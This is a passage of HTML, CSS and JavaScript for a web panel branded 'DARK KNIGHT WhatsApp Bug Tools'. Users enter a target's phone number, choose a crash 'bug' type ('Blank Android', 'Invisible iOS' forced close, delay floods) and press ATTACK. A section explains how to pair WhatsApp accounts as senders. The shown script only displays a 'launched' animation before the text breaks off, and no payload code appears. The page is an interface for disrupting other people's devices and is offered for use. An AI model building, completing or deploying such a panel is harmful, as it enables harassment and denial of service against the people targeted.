            box-shadow: 0 5px 15px rgba(177, 156, 217, 0.4);
        }

        /* Carousel Controls */
        .carousel-controls {
            position: absolute;
            bottom: -60px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 15px;
            z-index: 100;
        }

        .carousel-btn {
            width: 48px;
            height: 48px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            color: white;
            font-size: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .carousel-btn:hover {
            background: rgba(177, 156, 217, 0.2);
            border-color: var(--accent-purple-light);
        }

        .carousel-indicators {
            position: absolute;
            top: -40px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 10px;
            z-index: 100;
        }

        .indicator {
            width: 10px;
            height: 10px;
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .indicator.active {
            background: white;
            transform: scale(1.3);
        }

        /* Execute Button */
        .execute-section {
            text-align: center;
            padding: 40px 16px;
        }

        .execute-btn {
            padding: 18px 50px;
            background: linear-gradient(135deg, var(--accent-purple), var(--accent-purple-light));
            border: none;
            border-radius: 30px;
            color: white;
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 16px;
            font-family: 'Orbitron', monospace;
            box-shadow: 0 5px 20px rgba(177, 156, 217, 0.4);
        }

        .execute-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 30px rgba(177, 156, 217, 0.6);
        }

        .execute-btn:active {
            transform: translateY(-1px);
        }

        /* Music Section yang diperbaiki */
        .music-section {
            max-width: 600px;
            margin: 40px auto;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 20px;
            padding: 25px;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        .music-section:hover {
            box-shadow: 0 0 20px rgba(177, 156, 217, 0.3);
        }

        .music-title {
            font-family: 'Orbitron', monospace;
            font-size: 1.5rem;
            font-weight: 700;
            text-align: center;
            margin-bottom: 20px;
            background: linear-gradient(45deg, white, var(--accent-purple-light));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
        }

        .music-controls {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .music-select-container {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .music-select {
            flex: 1;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.4);
            color: #fff;
            padding: 12px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            outline: none;
            font-size: 14px;
            font-family: 'Rajdhani', sans-serif;
        }

        .music-btn {
            padding: 12px 20px;
            border: none;
            border-radius: 25px;
            background: linear-gradient(90deg, var(--accent-purple), var(--accent-purple-light));
            color: #fff;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(177, 156, 217, 0.5);
            transition: all 0.3s ease;
            font-family: 'Orbitron', monospace;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .music-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 25px var(--accent-purple-light);
        }

        .music-btn.playing {
            background: linear-gradient(90deg, #ff6b6b, #ffa36b);
            animation: pulse 1.8s infinite alternate;
        }

        .music-btn.loading {
            background: linear-gradient(90deg, #6b6bff, #6ba3ff);
            cursor: not-allowed;
        }

        .music-btn.error {
            background: linear-gradient(90deg, #ff6b6b, #ff3b3b);
        }

        @keyframes pulse {
            from { box-shadow: 0 0 20px rgba(177, 156, 217, 0.4); }
            to { box-shadow: 0 0 40px rgba(216, 200, 255, 0.6); transform: scale(1.05); }
        }

        /* Visualizer yang lebih baik */
        .visualizer-container {
            margin-top: 15px;
        }

        .visualizer {
            display: flex;
            justify-content: center;
            align-items: flex-end;
            height: 80px;
            gap: 4px;
            margin-bottom: 10px;
            position: relative;
        }

        .bar {
            width: 6px;
            background: linear-gradient(to top, var(--accent-purple), var(--accent-purple-light));
            border-radius: 3px;
            transition: height 0.3s ease;
        }

        .visualizer.playing .bar {
            animation: equalizer 1.5s ease infinite alternate;
        }

        .bar:nth-child(1) { animation-delay: 0s; }
        .bar:nth-child(2) { animation-delay: 0.1s; }
        .bar:nth-child(3) { animation-delay: 0.2s; }
        .bar:nth-child(4) { animation-delay: 0.3s; }
        .bar:nth-child(5) { animation-delay: 0.4s; }
        .bar:nth-child(6) { animation-delay: 0.5s; }
        .bar:nth-child(7) { animation-delay: 0.6s; }
        .bar:nth-child(8) { animation-delay: 0.7s; }
        .bar:nth-child(9) { animation-delay: 0.8s; }
        .bar:nth-child(10) { animation-delay: 0.9s; }

        @keyframes equalizer {
            0% { height: 10px; }
            25% { height: 30px; }
            50% { height: 50px; }
            75% { height: 30px; }
            100% { height: 10px; }
        }

        /* Progress bar untuk musik */
        .progress-container {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            margin-top: 10px;
            cursor: pointer;
            position: relative;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(to right, var(--accent-purple), var(--accent-purple-light));
            border-radius: 3px;
            width: 0%;
            transition: width 0.1s linear;
        }

        .time-display {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: var(--text-secondary);
            margin-top: 5px;
        }

        /* Volume control */
        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 15px;
        }

        .volume-icon {
            color: var(--accent-purple-light);
            font-size: 16px;
        }

        .volume-slider {
            flex: 1;
            -webkit-appearance: none;
            appearance: none;
            height: 5px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            outline: none;
        }

        .volume-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: var(--accent-purple-light);
            cursor: pointer;
        }

        .volume-slider::-moz-range-thumb {
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: var(--accent-purple-light);
            cursor: pointer;
            border: none;
        }

        /* Status info untuk musik */
        .music-status {
            text-align: center;
            font-size: 12px;
            color: var(--text-secondary);
            margin-top: 10px;
            min-height: 16px;
        }

        /* Footer */
        .footer {
            padding: 40px 20px;
            background: rgba(0, 0, 0, 0.8);
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
            margin-top: 60px;
        }

        .copyright {
            color: var(--accent-purple-light);
            font-size: 13px;
        }

        /* Animasi untuk notifikasi attack success */
        @keyframes attackSuccess {
            0% {
                transform: translate(-50%, -50%) scale(0.3);
                opacity: 0;
            }
            50% {
                transform: translate(-50%, -50%) scale(1.1);
                opacity: 1;
            }
            70% {
                transform: translate(-50%, -50%) scale(1.05);
            }
            100% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 1;
            }
        }

        @keyframes floatUp {
            0% {
                transform: translate(-50%, -50%);
                opacity: 1;
            }
            100% {
                transform: translate(-50%, -100px);
                opacity: 0;
            }
        }

        @keyframes confettiFall {
            0% {
                transform: translateY(-100px) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(100vh) rotate(360deg);
                opacity: 0;
            }
        }

        .attack-success-notification {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, rgba(76, 175, 80, 0.95), rgba(56, 142, 60, 0.95));
            color: white;
            padding: 30px 40px;
            border-radius: 20px;
            text-align: center;
            z-index: 10002;
            box-shadow: 0 0 50px rgba(76, 175, 80, 0.6);
            border: 2px solid rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(10px);
            animation: attackSuccess 0.8s cubic-bezier(0.4, 0.0, 0.2, 1) forwards;
            max-width: 400px;
            width: 90%;
        }

        .attack-success-icon {
            font-size: 4rem;
            margin-bottom: 15px;
            display: block;
            animation: bounce 1s ease infinite alternate;
        }

        @keyframes bounce {
            from { transform: scale(1); }
            to { transform: scale(1.1); }
        }

        .attack-success-title {
            font-family: 'Orbitron', monospace;
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .attack-success-message {
            font-size: 1rem;
            margin-bottom: 20px;
            opacity: 0.9;
        }

        .attack-progress {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 3px;
            overflow: hidden;
            margin-top: 15px;
        }

        .attack-progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #8BC34A);
            width: 0%;
            transition: width 2s linear;
            border-radius: 3px;
        }

        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background: var(--accent-purple-light);
            opacity: 0;
            z-index: 10001;
        }

        .confetti:nth-child(odd) {
            background: #4CAF50;
        }

        .confetti:nth-child(even) {
            background: #FFEB3B;
        }

        .attack-countdown {
            font-family: 'Orbitron', monospace;
            font-size: 1.2rem;
            color: #FFEB3B;
            margin-top: 10px;
            font-weight: 700;
        }

        /* Overlay untuk background blur */
        .attack-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
            z-index: 10000;
            opacity: 0;
            animation: fadeIn 0.3s ease forwards;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        /* Responsive */
        @media (max-width: 768px) {
            .hero-title {
                font-size: 2rem;
            }

            .carousel-container {
                height: 450px;
            }

            .carousel-item {
                width: 280px;
                height: 380px;
            }

            .section-title {
                font-size: 1.8rem;
            }

            .music-section {
                margin: 40px 16px;
            }
            
            .music-select-container {
                flex-direction: column;
            }
            
            .music-btn {
                width: 100%;
            }

            .target-image-container {
                height: 200px;
            }

            .target-text {
                font-size: 16px;
            }

            .nav-menu {
                position: fixed;
                left: -100%;
                top: 60px;
                flex-direction: column;
                background: rgba(18, 18, 18, 0.98);
                width: 100%;
                text-align: center;
                transition: 0.3s;
                padding: 20px 0;
                border-bottom: 1px solid rgba(255, 255, 255, 0.2);
                gap: 0;
            }

            .nav-menu li {
                margin: 10px 0;
            }

            .nav-menu a {
                display: block;
                padding: 15px 30px;
                font-size: 16px;
            }

            .nav-menu.active {
                left: 0;
            }

            .menu-toggle {
                display: flex;
            }
        }

        audio { display: none; }
        
.user-sender-section {
    max-width: 600px;
    margin: 40px auto;
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.2);
    border-radius: 20px;
    padding: 30px;
    backdrop-filter: blur(10px);
}

.sender-management {
    display: flex;
    flex-direction: column;
    gap: 25px;
}

.add-sender-form {
    display: flex;
    gap: 15px;
    align-items: flex-end;
}

.add-sender-form .input-group {
    flex: 1;
}

.add-sender-form .execute-btn {
    padding: 14px 25px;
    white-space: nowrap;
}

.senders-list-container h4 {
    color: var(--accent-purple-light);
    margin-bottom: 15px;
    font-family: 'Orbitron', monospace;
}

.senders-list {
    display: flex;
    flex-direction: column;
    gap: 10px;
}

.sender-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 15px;
    background: rgba(255, 255, 255, 0.08);
    border: 1px solid rgba(255, 255, 255, 0.15);
    border-radius: 12px;
    transition: all 0.3s ease;
}

.sender-item:hover {
    border-color: var(--accent-purple-light);
    transform: translateY(-2px);
}

.sender-info {
    display: flex;
    align-items: center;
    gap: 12px;
}

.sender-status {
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: #4CAF50;
}

.sender-status.connected {
    background: #4CAF50;
}

.sender-status.disconnected {
    background: #f44336;
}

.sender-number {
    font-weight: 600;
    color: white;
}

.sender-actions {
    display: flex;
    gap: 8px;
}

.delete-sender-btn {
    padding: 8px 12px;
    background: rgba(244, 67, 54, 0.2);
    border: 1px solid rgba(244, 67, 54, 0.5);
    border-radius: 8px;
    color: #ff6b6b;
    cursor: pointer;
    transition: all 0.3s ease;
    font-size: 12px;
}

.delete-sender-btn:hover {
    background: rgba(244, 67, 54, 0.3);
    transform: scale(1.05);
}

.no-senders {
    text-align: center;
    padding: 30px;
    color: var(--text-secondary);
}

.loading-text {
    text-align: center;
    padding: 20px;
    color: var(--text-secondary);
}

@media (max-width: 768px) {
    .add-sender-form {
        flex-direction: column;
        align-items: stretch;
    }
    
    .sender-item {
        flex-direction: column;
        gap: 10px;
        align-items: flex-start;
    }
    
    .sender-actions {
        align-self: flex-end;
    }
}

/* Animasi untuk notifikasi */
@keyframes slideIn {
    from { transform: translateX(100%); opacity: 0; }
    to { transform: translateX(0); opacity: 1; }
}

/* Status indicators */
.sender-status.connecting { background: #ff9800; }
.sender-status.waiting_pairing { background: #2196F3; }
.sender-status.connected { background: #4CAF50; }
.sender-status.error { background: #f44336; }

.instruction-box {
    background: rgba(177, 156, 217, 0.1);
    border: 1px solid rgba(177, 156, 217, 0.3);
    border-radius: 12px;
    padding: 20px;
    margin-bottom: 25px;
}

.instruction-box h4 {
    color: var(--accent-purple-light);
    margin-bottom: 15px;
    font-family: 'Orbitron', monospace;
}

.instruction-box ol {
    color: var(--text-secondary);
    padding-left: 20px;
}

.instruction-box li {
    margin-bottom: 8px;
    line-height: 1.5;
}
    </style>
</head>
<body>
    <audio id="bgm" loop></audio>
    <div class="grid-bg"></div>

    <!-- Header -->
    <header class="header" id="header">
        <nav class="nav-container">
            <a href="#" class="logo">
                <div class="logo-icon"></div>
                <span class="logo-text">DARK KNIGHT</span>
            </a>
            
            <ul class="nav-menu" id="navMenu">
                <li><a href="/dashboard" class="nav-link">Dashboard</a></li>
                <li><a href="/whatsapp-bug" class="nav-link active">WhatsApp Bug</a></li>
                <li><a href="https://wa.me/6287730232643" class="nav-link">WhatsApp</a></li>
                <li><a href="https://t.me/kyu_pedo" class="nav-link">Telegram</a></li>
                <li><a href="/logout" class="nav-link">Logout</a></li>
            </ul>
            
            <div class="menu-toggle" id="menuToggle">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </nav>
    </header>

    <!-- Hero Section -->
    <section class="hero">
        <div style="width: 100%; max-width: 1200px;">
            <div class="hero-content">
                <h1 class="hero-title">WhatsApp Bug Tools</h1>
                <p class="hero-subtitle">Pilih jenis bug dan masukkan nomor target</p>
            </div>

            <!-- Target Image Section -->
            <div class="target-image-section">
                <div class="target-image-container">
                    <div class="target-image">
                        <img src="https://files.catbox.moe/ys2yaz.jpg" alt="Target Image">
                        <div class="target-image-overlay">
                            <div class="target-text-container">
                                <div class="target-text">DARK KNIGHT EXECUTION</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <p class="target-description">
                    Masukkan nomor target WhatsApp yang valid dan aktif untuk memulai serangan. 
                    Sistem akan mengidentifikasi target dan mempersiapkan serangan sesuai dengan jenis bug yang dipilih.
                </p>
            </div>

            <!-- Input Section -->
            <div class="input-section">
                <div class="input-group">
                    <label class="input-label">
                        <i class="fas fa-phone"></i> Target Number
                    </label>
                    <input 
                        type="text" 
                        id="numberInput" 
                        class="input-field" 
                        placeholder="Example: 62xxx..."
                    />
                </div>
            </div>

            <!-- Carousel Section -->
            <div class="carousel-section">
                <h2 class="section-title">Select Bug Type</h2>
                <p class="section-subtitle">Geser untuk melihat berbagai jenis bug yang tersedia</p>
                
                <div class="carousel-container">
                    <div class="carousel" id="carousel"></div>
                    
                    <div class="carousel-controls">
                        <button class="carousel-btn" id="prevBtn">‹</button>
                        <button class="carousel-btn" id="nextBtn">›</button>
                    </div>
                    
                    <div class="carousel-indicators" id="indicators"></div>
                </div>
            </div>

            <!-- Execute Button -->
            <div class="execute-section">
                <button id="executeBtn" class="execute-btn">
                    <i class="fas fa-bolt"></i> ATTACK
                </button>
            </div>

            <!-- Music Section yang diperbaiki -->
            <div class="music-section">
                <h3 class="music-title">Background Music</h3>
                <div class="music-controls">
                    <div class="music-select-container">
                        <select id="songSelect" class="music-select">
                            <option value="">-- Select Music --</option>
                            <option value="https://files.catbox.moe/b352na.mp3">Phónk 1</option>
                            <option value="https://files.catbox.moe/botafh.mp3">Phónk 2</option>
                            <option value="https://files.catbox.moe/zr0xhu.mp3">Blue Yung kai</option>
                            <option value="https://files.catbox.moe/onf6hc.mp3">Wildflower</option>
                            <option value="https://files.catbox.moe/8peup4.mp3">Serana</option>
                            <option value="https://files.catbox.moe/db6728.mp3">Feast Tarrot</option>
                        </select>
                        <button id="musicBtn" class="music-btn">
                            <i class="fas fa-play"></i> PLAY
                        </button>
                    </div>
                    
                    <div class="volume-control">
                        <i class="fas fa-volume-down volume-icon"></i>
                        <input type="range" id="volumeSlider" class="volume-slider" min="0" max="1" step="0.01" value="0.5">
                        <i class="fas fa-volume-up volume-icon"></i>
                    </div>
                    
                    <div class="visualizer-container">
                        <div class="visualizer" id="visualizer">
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                        </div>
                        
                        <div class="progress-container" id="progressContainer">
                            <div class="progress-bar" id="progressBar"></div>
                        </div>
                        
                        <div class="time-display">
                            <span id="currentTime">0:00</span>
                            <span id="duration">0:00</span>
                        </div>
                    </div>
                    
                    <div class="music-status" id="musicStatus"></div>
                </div>
            </div>
        </div>
    </section>
    
<!-- User Sender Management Section -->
<div class="user-sender-section">
    <h3 class="section-title">My Senders</h3>
    <p class="section-subtitle">Kelola sender WhatsApp Anda sendiri</p>
    
    <!-- Tambahkan instruksi di sini -->
    <div class="instruction-box">
        <h4><i class="fas fa-info-circle"></i> Cara Menghubungkan:</h4>
        <ol>
            <li>Masukkan nomor WhatsApp (contoh: 6281234567890)</li>
            <li>Klik "ADD SENDER"</li>
            <li>Nanti <strong>code pairing</strong> bakal muncul</li>
            <li>Buka WhatsApp > Linked Devices > Link a Device</li>
            <li>Masukkan kode pairingnya deh. beres</li>
        </ol>
    </div>
    
    <div class="sender-management">
        <!-- Add Sender Form -->
        <div class="add-sender-form">
            <div class="input-group">
                <label class="input-label">
                    <i class="fas fa-plus-circle"></i> Tambah Sender Baru
                </label>
                <input 
                    type="text" 
                    id="newSenderNumber" 
                    class="input-field" 
                    placeholder="62xxxxxxxxxx"
                />
            </div>
            <button id="addSenderBtn" class="execute-btn">
                <i class="fas fa-plus"></i> ADD SENDER
            </button>
        </div>
        
        <!-- Senders List -->
        <div class="senders-list-container">
            <h4>Daftar Sender Anda</h4>
            <div id="sendersList" class="senders-list">
                <div class="loading-text">Memuat sender...</div>
            </div>
        </div>
    </div>
</div>

    <!-- Footer -->
    <footer class="footer">
        <div class="copyright">
            © 2025 DARK KNIGHT. All rights reserved.
        </div>
    </footer>

    <script>
        // Music functionality - DIPERBAIKI
        const bgm = document.getElementById('bgm');
        const musicBtn = document.getElementById('musicBtn');
        const songSelect = document.getElementById('songSelect');
        const visualizer = document.getElementById('visualizer');
        const progressBar = document.getElementById('progressBar');
        const progressContainer = document.getElementById('progressContainer');
        const currentTimeEl = document.getElementById('currentTime');
        const durationEl = document.getElementById('duration');
        const volumeSlider = document.getElementById('volumeSlider');
        const musicStatus = document.getElementById('musicStatus');
        
        let isPlaying = false;
        let isLoaded = false;

        // Format waktu
        function formatTime(seconds) {
            const mins = Math.floor(seconds / 60);
            const secs = Math.floor(seconds % 60);
            return \`\${mins}:\${secs < 10 ? '0' : ''}\${secs}\`;
        }

        // Update progress bar
        function updateProgress() {
            if (isLoaded) {
                const { duration, currentTime } = bgm;
                const progressPercent = (currentTime / duration) * 100;
                progressBar.style.width = \`\${progressPercent}%\`;
                currentTimeEl.textContent = formatTime(currentTime);
                durationEl.textContent = formatTime(duration);
            }
        }

        // Set progress bar saat diklik
        function setProgress(e) {
            if (!isLoaded) return;
            
            const width = this.clientWidth;
            const clickX = e.offsetX;
            const duration = bgm.duration;
            
            bgm.currentTime = (clickX / width) * duration;
        }

        // Update volume
        function updateVolume() {
            bgm.volume = volumeSlider.value;
        }

        // Reset music state
        function resetMusicState() {
            isPlaying = false;
            isLoaded = false;
            musicBtn.innerHTML = '<i class="fas fa-play"></i> PLAY';
            musicBtn.classList.remove('playing', 'loading', 'error');
            visualizer.classList.remove('playing');
            progressBar.style.width = '0%';
            currentTimeEl.textContent = '0:00';
            durationEl.textContent = '0:00';
            musicStatus.textContent = '';
        }

        // Music button click handler
        musicBtn.addEventListener('click', async () => {
            const selected = songSelect.value;
            if (!selected) {
                musicStatus.textContent = '⚠️ Pilih lagu terlebih dahulu!';
                return;
            }

            if (!isPlaying) {
                // Jika belum dimuat atau lagu berubah, muat ulang
                if (bgm.src !== selected || !isLoaded) {
                    resetMusicState();
                    musicBtn.classList.add('loading');
                    musicBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> LOADING';
                    musicStatus.textContent = 'Memuat musik...';
                    
                    try {
                        bgm.src = selected;
                        bgm.volume = volumeSlider.value;
                        
                        // Tunggu hingga metadata dimuat
                        await new Promise((resolve, reject) => {
                            bgm.addEventListener('loadedmetadata', resolve, { once: true });
                            bgm.addEventListener('error', reject, { once: true });
                        });
                        
                        isLoaded = true;
                        musicStatus.textContent = 'Musik siap diputar';
                    } catch (err) {
                        console.error('Gagal memuat musik:', err);
                        musicBtn.classList.remove('loading');
                        musicBtn.classList.add('error');
                        musicBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ERROR';
                        musicStatus.textContent = '❌ Gagal memuat musik. Coba file lain.';
                        return;
                    }
                }
                
                // Coba putar musik
                try {
                    await bgm.play();
                    isPlaying = true;
                    musicBtn.innerHTML = '<i class="fas fa-pause"></i> PAUSE';
                    musicBtn.classList.remove('loading', 'error');
                    musicBtn.classList.add('playing');
                    visualizer.classList.add('playing');
                    musicStatus.textContent = 'Musik sedang diputar';
                } catch (err) {
                    console.error('Gagal memutar musik:', err);
                    musicBtn.classList.remove('loading');
                    musicBtn.classList.add('error');
                    musicBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ERROR';
                    musicStatus.textContent = '❌ Gagal memutar musik. Coba klik lagi.';
                }
            } else {
                // Jeda musik
                bgm.pause();
                isPlaying = false;
                musicBtn.innerHTML = '<i class="fas fa-play"></i> PLAY';
                musicBtn.classList.remove('playing');
                visualizer.classList.remove('playing');
                musicStatus.textContent = 'Musik dijeda';
            }
        });

        // Event listeners untuk musik
        bgm.addEventListener('timeupdate', updateProgress);
        bgm.addEventListener('ended', () => {
            isPlaying = false;
            musicBtn.innerHTML = '<i class="fas fa-play"></i> PLAY';
            musicBtn.classList.remove('playing');
            visualizer.classList.remove('playing');
            musicStatus.textContent = 'Musik selesai';
        });
        
        bgm.addEventListener('error', () => {
            console.error('Error audio:', bgm.error);
            resetMusicState();
            musicBtn.classList.add('error');
            musicBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ERROR';
            musicStatus.textContent = '❌ Error memuat musik. Format tidak didukung atau file rusak.';
        });
        
        progressContainer.addEventListener('click', setProgress);
        volumeSlider.addEventListener('input', updateVolume);
        
        // Reset status saat lagu berubah
        songSelect.addEventListener('change', () => {
            resetMusicState();
        });

        // Bug types data dengan Font Awesome icons
        const bugTypes = [
            {
                id: 'delay',
                icon: '<i class="fas fa-hourglass-half"></i>',
                title: 'Delay 50%',
                description: 'Bug dengan delay 50% - cocok untuk testing ringan',
                badge: 'Low Impact'
            },
            {
                id: 'medium',
                icon: '<i class="fas fa-tachometer-alt-fast"></i>',
                title: 'Delay 100%',
                description: 'Bug dengan delay penuh - impact medium pada target',
                badge: 'Medium Impact'
            },
            {
                id: 'blank-ios',
                icon: '<i class="fab fa-apple"></i>',
                title: 'Iphone Hard',
                description: 'Bug iOS tingkat tinggi - telihat',
                badge: 'PayFlood'
            },
            {
                id: 'blank',
                icon: '<i class="fab fa-android"></i>',
                title: 'Blank Android',
                description: 'Bug untuk Android - mengakibatkan stuck',
                badge: 'Load Blank'
            },
            {
                id: 'fcinvsios',
                icon: '<i class="fas fa-eye-slash"></i>',
                title: 'Invisible iOS',
                description: 'Bug invisible keluar paksa - efek maksimal',
                badge: 'High Impact'
            }
        ];

        // Carousel logic
        let currentIndex = 0;
        let selectedBugType = null;
        const carousel = document.getElementById('carousel');
        const indicatorsContainer = document.getElementById('indicators');

        function createCarouselItem(data, index) {
            const item = document.createElement('div');
            item.className = 'carousel-item';
            item.dataset.index = index;
            item.dataset.bugId = data.id;
            
            item.innerHTML = \`
                <div class="card">
                    <div class="card-icon">\${data.icon}</div>
                    <h3 class="card-title">\${data.title}</h3>
                    <p class="card-description">\${data.description}</p>
                    <span class="card-badge">\${data.badge}</span>
                    <button class="card-cta">SELECT BUG</button>
                </div>
            \`;
            
            return item;
        }

        function initCarousel() {
            bugTypes.forEach((data, index) => {
                const item = createCarouselItem(data, index);
                carousel.appendChild(item);
                
                const indicator = document.createElement('div');
                indicator.className = 'indicator';
                if (index === 0) indicator.classList.add('active');
                indicator.dataset.index = index;
                indicator.addEventListener('click', () => goToSlide(index));
                indicatorsContainer.appendChild(indicator);
            });
            
            updateCarousel();
        }

        function updateCarousel() {
            const items = document.querySelectorAll('.carousel-item');
            const indicators = document.querySelectorAll('.indicator');
            const totalItems = items.length;
            const isMobile = window.innerWidth <= 768;
            
            items.forEach((item, index) => {
                let offset = index - currentIndex;
                
                if (offset > totalItems / 2) {
                    offset -= totalItems;
                } else if (offset < -totalItems / 2) {
                    offset += totalItems;
                }
                
                const absOffset = Math.abs(offset);
                const sign = offset < 0 ? -1 : 1;
                
                item.style.transition = 'all 0.8s cubic-bezier(0.4, 0.0, 0.2, 1)';
                
                const spacing1 = isMobile ? 280 : 320;
                const spacing2 = isMobile ? 420 : 480;
                
                if (absOffset === 0) {
                    item.style.transform = 'translate(-50%, -50%) translateZ(0) scale(1)';
                    item.style.opacity = '1';
                    item.style.zIndex = '10';
                } else if (absOffset === 1) {
                    const translateX = sign * spacing1;
                    const rotation = isMobile ? 25 : 30;
                    item.style.transform = \`translate(-50%, -50%) translateX(\${translateX}px) translateZ(-200px) rotateY(\${-sign * rotation}deg) scale(0.85)\`;
                    item.style.opacity = '0.7';
                    item.style.zIndex = '5';
                } else if (absOffset === 2) {
                    const translateX = sign * spacing2;
                    item.style.transform = \`translate(-50%, -50%) translateX(\${translateX}px) translateZ(-350px) rotateY(\${-sign * 40}deg) scale(0.7)\`;
                    item.style.opacity = '0.4';
                    item.style.zIndex = '3';
                } else {
                    item.style.transform = 'translate(-50%, -50%) translateZ(-500px) scale(0.5)';
                    item.style.opacity = '0';
                    item.style.zIndex = '1';
                }
            });
            
            indicators.forEach((indicator, index) => {
                indicator.classList.toggle('active', index === currentIndex);
            });
        }

        function nextSlide() {
            currentIndex = (currentIndex + 1) % bugTypes.length;
            updateCarousel();
        }

        function prevSlide() {
            currentIndex = (currentIndex - 1 + bugTypes.length) % bugTypes.length;
            updateCarousel();
        }

        function goToSlide(index) {
            currentIndex = index;
            updateCarousel();
        }

        document.getElementById('nextBtn').addEventListener('click', nextSlide);
        document.getElementById('prevBtn').addEventListener('click', prevSlide);

        // Auto-rotate
        setInterval(nextSlide, 5000);

        // Touch swipe
        let touchStartX = 0;
        let touchEndX = 0;

        carousel.addEventListener('touchstart', e => {
            touchStartX = e.changedTouches[0].screenX;
        });

        carousel.addEventListener('touchend', e => {
            touchEndX = e.changedTouches[0].screenX;
            const swipeDistance = touchEndX - touchStartX;
            
            if (Math.abs(swipeDistance) > 50) {
                if (swipeDistance > 0) {
                    prevSlide();
                } else {
                    nextSlide();
                }
            }
        });

        // Card selection
        carousel.addEventListener('click', (e) => {
            if (e.target.classList.contains('card-cta')) {
                const item = e.target.closest('.carousel-item');
                selectedBugType = item.dataset.bugId;
                
                // Visual feedback
                document.querySelectorAll('.card').forEach(card => {
                    card.style.border = '1px solid rgba(255, 255, 255, 0.2)';
                });
                item.querySelector('.card').style.border = '2px solid var(--accent-purple-light)';
                
                // Update button text
                e.target.textContent = '✓ SELECTED';
                setTimeout(() => {
                    e.target.textContent = 'SELECT BUG';
                }, 2000);
            }
        });

        // Execute button dengan animasi notifikasi sukses
        document.getElementById('executeBtn').addEventListener('click', () => {
            const number = document.getElementById('numberInput').value.trim().replace(/\\s+/g, '');
            
            if (!number) {
                showNotification('⚠️ Masukkan nomor target terlebih dahulu!', 'error');
                return;
            }
            
            if (!selectedBugType) {
                showNotification('⚠️ Pilih jenis bug terlebih dahulu!', 'error');
                return;
            }
            
            // Tampilkan animasi notifikasi sukses
            showAttackSuccessNotification(number, selectedBugType);
        });

        // Function untuk menampilkan notifikasi sukses attack
        function showAttackSuccessNotification(number, bugType) {
            // Buat overlay
            const overlay = document.createElement('div');
            overlay.className = 'attack-overlay';
            document.body.appendChild(overlay);

            // Buat notifikasi
            const notification = document.createElement('div');
            notification.className = 'attack-success-notification';
            notification.innerHTML = \`
                <div class="attack-success-icon">
                    <i class="fas fa-rocket"></i>
                </div>
                <h2 class="attack-success-title">ATTACK LAUNCHED!</h2>
                <p class="attack-success-message">
                    Bug <strong>\${bugType.toUpperCase()}</strong> berhasil dikirim ke<br>
                    <strong>\${number}</strong>
                </p>
                <div class="attack-countdown" id="countdown">Mengarahkan dalam 3 detik...</div>
                <div class="attack-progress">
                    <div class="attack-progress-bar" id="progressBarAttack"></div>
                </div>
            \`;
            document.body.appendChild(notification);

            // Buat confetti
            createConfetti();

            // Animasikan progress bar
            setTimeout(() => {
                const progressBar = document.getElementById('progressBarAttack');
                progressBar.style.width = '100%';
            }, 100);

            // Countdown dan redirect
            let countdown = 3;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownElement.textContent = \`Mengarahkan dalam \${countdown} detik...\`;
                
                if (countdown <= 0) {
